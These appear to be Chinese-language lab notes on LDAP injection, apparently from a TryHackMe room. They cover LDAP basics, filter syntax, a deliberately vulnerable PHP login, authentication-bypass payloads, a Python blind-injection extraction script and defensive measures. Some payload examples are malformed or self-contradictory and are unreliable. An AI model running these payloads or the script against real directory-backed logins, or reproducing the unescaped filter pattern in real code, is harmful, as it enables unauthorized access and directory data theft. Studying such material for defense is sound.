### LDAP 基础概念

轻量级目录访问协议 (Lightweight Directory Access Protocol, LDAP) 是一种开放的、跨平台的、基于 TCP/IP 的协议，用于访问和维护分布式目录信息服务。目录服务就像一个特殊的数据库，优化用于读取、浏览和搜索，主要存储有关用户、组、设备、权限等信息。

*   **用途:** LDAP 广泛用于：
    *   **集中式认证与授权:** 许多 Web 应用、网络服务和操作系统使用 LDAP 作为后端来验证用户身份和确定访问权限。
    *   **目录信息管理:** 存储和检索组织结构、联系人信息、资源配置等。
    *   **单点登录 (SSO):** 作为实现 SSO 解决方案的基础。
*   **常见实现:**
    *   **Microsoft Active Directory (AD):** Windows 域环境的核心组件，使用 LDAP（以及 Kerberos 等其他协议）进行目录访问和管理。
    *   **OpenLDAP:** 最流行的开源 LDAP 服务器实现，广泛应用于 Linux/Unix 环境。
    *   其他如 389 Directory Server, Apache Directory Server 等。

### LDAP 结构与术语

LDAP 目录信息以层次化的树状结构组织，类似于文件系统的目录结构。

1.  **条目 (Entry):** 目录中的基本信息单元，代表一个独立的对象（如一个用户、一个组、一台打印机）。每个条目都有一个唯一的标识符。
2.  **对象类 (Object Class):** 定义了条目可以或必须包含哪些属性，以及条目的类型（如 `inetOrgPerson`, `groupOfNames`, `organizationalUnit`）。每个条目都属于一个或多个对象类。
3.  **属性 (Attribute):** 描述条目特征的键值对。每个属性有一个类型（如 `cn`, `sn`, `mail`, `uid`, `userPassword`）和一个或多个值。
    *   示例属性: `cn=John Doe`, `mail=john@example.com`, `uid=jdoe`
4.  **区分名称 (Distinguished Name, DN):** 目录中每个条目的**唯一全局标识符**。它是一个从根节点到该条目的完整路径，由一系列 RDN 组成，用逗号分隔。
    *   示例 DN: `uid=jdoe,ou=People,dc=example,dc=com`
5.  **相对区分名称 (Relative Distinguished Name, RDN):** DN 中的一个组成部分，用于在特定层级内唯一标识一个条目。通常是条目的某个关键属性和值。
    *   示例 RDN: `uid=jdoe` (在上例 DN 中)
6.  **目录信息树 (Directory Information Tree, DIT):** LDAP 目录的整个层次结构。
    *   **根节点/后缀 (Base DN/Suffix):** DIT 的起始点，通常基于组织的域名。例如 `dc=example,dc=com` (`dc` 代表 Domain Component)。
    *   **组织单位 (Organizational Unit, OU):** 用于在 DIT 中组织条目的容器，类似于文件系统中的文件夹。例如 `ou=People`, `ou=Groups`。
7.  **LDIF (LDAP Data Interchange Format):** 一种标准化的纯文本格式，用于表示 LDAP 条目和目录更新操作（添加、修改、删除）。常用于导入/导出数据或批量修改。

### LDAP 搜索查询

与 LDAP 目录交互的主要方式是通过搜索查询来定位和检索信息。

1.  **查询组件:**
    *   **基本 DN (Base DN):** 指定搜索操作在 DIT 中的起始位置。
    *   **范围 (Scope):** 定义搜索的深度：
        *   `base`: 只搜索基本 DN 指定的条目本身。
        *   `onelevel`: 只搜索基本 DN 的直接子条目。
        *   `subtree`: 搜索基本 DN 及其下的所有子孙条目（最常用）。
    *   **过滤器 (Filter):** 定义匹配条目必须满足的条件。这是 LDAP 注入的主要目标。
    *   **属性列表 (Attributes):** 指定需要从匹配条目中返回哪些属性。如果省略，通常返回所有用户属性。

2.  **过滤器语法 (RFC 4515):**
    *   基本格式: `(attribute=value)`
    *   **常用操作符:**
        *   `=` (等于): `(cn=John Doe)`
        *   `*` (通配符): 匹配任意字符序列。
            *   `(cn=J*)` (以 J 开头)
            *   `(cn=*Doe)` (以 Doe 结尾)
            *   `(cn=*o*n*)` (包含 o 和 n)
            *   `(objectClass=*)` (存在 objectClass 属性)
        *   `=` (存在性): `(mail=*)` (检查是否存在 mail 属性)
        *   `>=` (大于等于), `<=` (小于等于): `(uidNumber>=1000)`
        *   `~=` (约等于): 语音或模糊匹配，不常用。
        *   `!` (逻辑非/NOT): `(!(objectClass=computer))`
    *   **逻辑组合操作符 (前缀表示法):**
        *   `&` (逻辑与/AND): `(&(objectClass=user)(l=London))` (是用户且在伦敦)
        *   `|` (逻辑或/OR): `(|(cn=John Doe)(cn=Jane Doe))` (是 John 或 Jane)
        *   **嵌套:** 操作符可以嵌套使用，形成复杂的逻辑。
            `(&(objectClass=inetOrgPerson)(|(mail=*@example.com)(mobile=*555*)))` (是个人，且邮箱是 @example.com 或手机号包含 555)

3.  **查询工具 (`ldapsearch`):**
    *   一个常用的命令行工具（通常随 OpenLDAP 提供），用于执行 LDAP 搜索。
    *   **示例命令:**
        ```bash
        # 搜索 Base DN 为 "dc=ldap,dc=thm"，过滤条件为 ou=People 的所有条目
        # -x 表示简单认证 (匿名或无密码)
        # -H 指定 LDAP 服务器地址和端口 (默认 389)
        # -b 指定 Base DN
        ldapsearch -x -H ldap://10.10.146.89:389 -b "dc=ldap,dc=thm" "(ou=People)" cn mail uid
        # 上述命令还会请求只返回 cn, mail, uid 属性
        ```
    *   LDAP 服务通常监听端口 `389` (未加密或 StartTLS) 和 `636` (LDAPS - 基于 SSL/TLS 的加密)。

### LDAP 注入概述

LDAP 注入是一种安全漏洞，当 Web 应用程序或其他系统**将用户提供的输入未经适当清理或转义就直接拼接到 LDAP 查询（特别是过滤器部分）中**时发生。这使得攻击者能够修改 LDAP 查询的逻辑，可能导致：

*   **认证绕过:** 无需有效凭证即可登录系统。
*   **信息泄露:** 获取未经授权访问的目录信息（如用户列表、属性、密码哈希等）。
*   **权限提升:** 获取比预期更高的权限。
*   **数据篡改:** 修改目录中的数据（如果应用绑定的 LDAP 用户权限足够高）。
*   **拒绝服务 (DoS):** 通过构造资源密集型查询使 LDAP 服务器过载。

**与 SQL 注入的相似性:** 核心原理都是将用户数据误解为查询代码。不同之处在于目标语言（LDAP 过滤器语法 vs SQL）和利用的特定语法结构。

### LDAP 注入利用

#### 注入点识别

通常发生在处理用户登录、搜索目录、个人信息查询等功能的代码中。需要检查应用程序如何构建 LDAP 过滤器字符串，特别是如何处理来自用户表单、URL 参数或 API 请求的数据。

#### 示例易受攻击代码 (PHP)

```php
<?php
// !!! 易受攻击的代码示例 !!!
$username = $_POST['username']; // 用户输入
$password = $_POST['password']; // 用户输入

$ldap_server = "ldap://localhost";
$ldap_conn = ldap_connect($ldap_server);
// ... (省略连接和绑定代码，假设已用管理凭证绑定) ...

// 关键：直接将用户输入拼接到过滤器中，没有清理！
$filter = "(&(uid=$username)(userPassword=$password))";

$search_result = ldap_search($ldap_conn, "ou=People,dc=ldap,dc=thm", $filter);
$entries = ldap_get_entries($ldap_conn, $search_result);

if ($entries['count'] > 0) {
    echo "Login successful!";
} else {
    echo "Login failed.";
}
ldap_close($ldap_conn);
?>
```

#### 认证绕过技术

1.  **通配符注入 (Wildcard Injection):**
    *   **原理:** 利用 `*` 通配符匹配任意值。
    *   **Payload:**
        *   `username=*`
        *   `password=*`
    *   **注入后的过滤器:** `(&(uid=*)(userPassword=*))`
    *   **效果:** 这个过滤器会匹配任何同时具有 `uid` 和 `userPassword` 属性的条目，无论其值是什么。如果 LDAP 目录中存在任何用户，查询就会成功返回（通常是第一个匹配的用户），从而绕过认证。
    *   **变种 (定位特定用户):**
        *   `username=admin*`
        *   `password=*`
        *   **过滤器:** `(&(uid=admin*)(userPassword=*))`
        *   **效果:** 尝试以 `admin` 开头的用户名登录，无需知道密码。

2.  **基于永真条件的注入 (Tautology-based Injection / Filter Manipulation):**
    *   **原理:** 注入 LDAP 过滤器语法，构造一个逻辑上始终为真的条件，或者通过逻辑运算符改变原始查询的意图。
    *   **Payload (示例 1 - 利用空 AND):**
        *   `username=*)(|(&)`
        *   `password=pwd)`  *(这里的 `pwd)` 用于闭合原始过滤器中 `userPassword` 部分的括号)*
    *   **注入后的过滤器:** `(&(uid=*)(|(&))(userPassword=pwd)))`  *(这个过滤器结构有点问题，更好的 payload 见下)*
    *   **Payload (示例 2 - 更常见的 OR 注入):**
        *   假设原始过滤器是 `(uid=$username)` (仅验证用户名是否存在)
        *   `username=*)(uid=*))`  *(注入 `*)` 闭合 `uid=`，然后添加 `(uid=*)` 使其永真)*
        *   **过滤器:** `(uid=*)(uid=*))` (语法错误)
        *   **Payload (示例 3 - 针对 AND 结构的 OR 注入):**
            *   原始过滤器: `(&(uid=$username)(userPassword=$password))`
            *   `username=admin)(|(uid=*)`  *(注入 `)` 闭合 `uid=`，然后开始 OR 条件)*
            *   `password=*)(userPassword=*))` *(注入 `*)` 闭合 `userPassword=`，然后添加永真条件并闭合 OR 和 AND)*
            *   **过滤器 (可能结果，取决于拼接逻辑):** `(&(uid=admin)(|(uid=*)(userPassword=*)))`
            *   **效果:** 查找 `uid=admin` **或者** (`uid=*` **或者** `userPassword=*`)。由于 `(uid=*)` 几乎总是真，整个 OR 条件为真，导致无论密码是否正确，只要 `uid=admin` 存在，查询就可能成功。
    *   **Payload (示例 4 - 利用 `*` 结合逻辑运算符绕过密码):**
        *   `username=admin*) L_PAREN | R_PAREN (&)`  (这里的 `L_PAREN` `R_PAREN` 代表注入的括号)
        *   `password=*)`
        *   **注入后过滤器:** `(&(uid=admin*)(|(&(userPassword=*))))`
        *   **效果:** 查找 `uid` 以 `admin` 开头，并且 (`(&)` 这个空 AND 条件为真，或者 `userPassword=*` 存在性检查为真)。由于空 AND 永真，整个 OR 条件永真，从而绕过密码检查。

#### LDAP 盲注 (Blind LDAP Injection)

*   **场景:** 当应用程序执行了注入的 LDAP 查询，但**不直接显示查询结果或详细错误信息**时。攻击者只能通过观察应用程序的**间接反馈**（如通用错误消息、响应时间差异、页面行为变化）来推断信息。
*   **技术:**
    *   **基于布尔的盲注 (Boolean-based):** 构造使 LDAP 过滤器条件为真或假的注入。观察应用程序的响应（例如，“用户存在” vs “用户不存在”，“登录成功” vs “密码错误”）。
        *   **示例 (利用前述易受攻击代码的盲注场景):** 假设代码在用户存在但密码错误时返回 "Something is wrong in your password."，而在用户不存在时返回 "Login failed."。
        *   **目标:** 猜测某个用户的属性，比如 `admin` 用户的邮箱首字母。
        *   **Payload (猜测首字母是否为 'a'):**
            *   `username=admin)(mail=a*`
            *   `password=*)`
            *   **注入后过滤器:** `(&(uid=admin)(mail=a*)(userPassword=*))` (假设拼接逻辑如此)
            *   **观察:** 如果返回 "Something is wrong..."，说明 `admin` 用户存在且其 `mail` 属性以 'a' 开头。如果返回 "Login failed."，说明不满足此条件。
            *   **迭代:** 逐个字符猜测，类似于 SQL 盲注。
    *   **基于时间的盲注 (Time-based):** 如果 LDAP 服务器或查询本身支持导致延迟的操作（这在标准 LDAP 中不常见，不像 SQL 的 `sleep()`），或者可以通过构造非常复杂的、消耗资源的查询来引发延迟，那么可以通过测量响应时间来判断条件真假。

*   **自动化盲注 (Python 示例):**
    *   脚本通过发送一系列精心构造的 POST 请求，每次猜测一个字符。
    *   它检查响应页面中是否存在特定文本（如 "Something is wrong..." 或 "Welcome...") 来判断猜测是否正确。
    *   如果猜测正确，将该字符添加到已知前缀 (`successful_chars`)，并继续猜测下一个字符。
    *   直到无法找到新的正确字符为止。

```python
import requests
from bs4 import BeautifulSoup
import string
import time
import urllib.parse

# 目标 URL
url = 'http://<TARGET_IP>/blind.php' # 替换为实际 URL

# 猜测用的字符集
# char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation # 可以根据需要调整
char_set = string.printable.strip() # 更全的字符集，去除空白符

# 初始化已知的前缀
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

print(f"Starting blind LDAP injection on {url}")
print(f"Using char set: {char_set}")

while True:
    found_char_in_iteration = False
    for char_to_guess in char_set:
        # 构造注入 payload，尝试猜测下一个字符
        # 假设目标是猜测 uid=admin 的某个属性值
        # 注意：payload 结构需要根据实际注入点和目标调整
        # 这里假设注入 username，利用 `*` 和 `(` `)` `&` `|` 构造布尔条件
        # payload = f"admin*)(attribute={successful_chars}{char_to_guess}*" # 示例：猜测 attribute
        # 为了匹配笔记中的例子，我们尝试猜测存在的用户名
        payload_username_raw = f"{successful_chars}{char_to_guess}*)(|(&" # 原始 payload
        payload_password_raw = "pwd)"

        # URL 编码 payload
        payload_username_encoded = urllib.parse.quote(payload_username_raw)
        payload_password_encoded = urllib.parse.quote(payload_password_raw)

        data = f'username={payload_username_encoded}&password={payload_password_encoded}'

        try:
            response = requests.post(url, data=data, headers=headers, timeout=10) # 设置超时
            response.raise_for_status() # 检查 HTTP 错误

            # 解析 HTML 响应
            soup = BeautifulSoup(response.content, 'html.parser')

            # *** 关键：定义成功的标志 ***
            # 根据实际应用返回的“真”条件下的特定文本或元素来判断
            # 例如，笔记中提到 "Something is wrong in your password." 表示用户存在但密码错误
            # 我们以此作为“真”的标志
            success_indicators = soup.find_all(string=lambda text: "Something is wrong in your password." in text)
            # 或者可能是 "Welcome, ..."
            # success_indicators = soup.find_all('p', style='color: green;')

            if success_indicators:
                successful_chars += char_to_guess
                print(f"[+] Found character: '{char_to_guess}'. Current string: {successful_chars}")
                found_char_in_iteration = True
                # time.sleep(0.1) # 可选：稍微延迟避免过快请求
                break # 找到当前位置的字符，跳出内层循环，猜测下一位

        except requests.exceptions.RequestException as e:
            print(f"[-] Request error for char '{char_to_guess}': {e}")
            # 根据情况决定是否继续或停止
            # time.sleep(1) # 出错时等待

    if not found_char_in_iteration:
        print(f"\n[*] No more characters found. Final result: {successful_chars}")
        break # 外层循环结束

print("[*] Blind LDAP injection attempt finished.")

```

### 防御措施

防御 LDAP 注入的关键在于**严格处理所有用户输入**，并遵循安全编码实践。

1.  **输入验证与清理 (Input Validation and Sanitization):**
    *   **类型检查:** 确保输入符合预期的数据类型。
    *   **白名单验证:** 只允许输入包含在预定义安全字符集中的字符。拒绝或转义任何可能用于构造 LDAP 过滤器的特殊字符，如 `(`, `)`, `*`, `\`, `&`, `|`, `!`, `=`, `<`, `>`, `~`。
    *   **长度限制:** 限制输入长度，防止异常输入。
    *   **使用框架/库提供的清理函数:** 许多 Web 框架或 LDAP 库提供了用于安全处理 LDAP 输入的函数。

2.  **使用安全的 LDAP API 或转义:**
    *   **参数化查询 (如果库支持):** 类似于 SQL 的 Prepared Statements，一些现代 LDAP 库可能提供参数化接口，将用户输入作为数据传递，而不是直接拼接到过滤器字符串中。**这是最理想的方式，但并非所有库都支持。**
    *   **LDAP 过滤器转义:** 对所有插入 LDAP 过滤器的用户输入执行**专门的 LDAP 转义**。需要转义的字符至少包括 `*`, `(`, `)`, `\`, NUL (`\00`)。转义规则是用反斜杠 `\` 加上字符的两位十六进制 ASCII 值（例如 `*` 转义为 `\2a`）。许多语言的 LDAP 库提供了执行此操作的函数（如 PHP 的 `ldap_escape()` - 需要注意其模式参数）。

3.  **最小权限原则:**
    *   应用程序绑定（连接）到 LDAP 服务器时使用的账户，应只拥有执行其业务逻辑所必需的最低权限。
    *   例如，如果应用只需要验证用户凭证，则绑定用户可能只需要对用户条目的特定属性（如 `userPassword`）有比较权限，而不需要读取其他敏感属性或修改目录。
    *   避免使用 LDAP 管理员账户进行常规的应用绑定。

4.  **避免暴露过多的错误信息:**
    *   不要在生产环境中向用户显示详细的 LDAP 错误消息。这些信息可能帮助攻击者了解目录结构或确认注入是否成功。记录详细错误到服务器端日志，向用户返回通用错误提示。

5.  **Web 应用防火墙 (WAF):**
    *   部署 WAF 可以帮助检测和阻止一些常见的 LDAP 注入攻击模式。但 WAF 不应作为唯一的防御措施。

6.  **安全编码实践:**
    *   对处理用户输入并与 LDAP 交互的所有代码进行仔细的安全审查。
    *   使用成熟、维护良好的 LDAP 库和 Web 框架。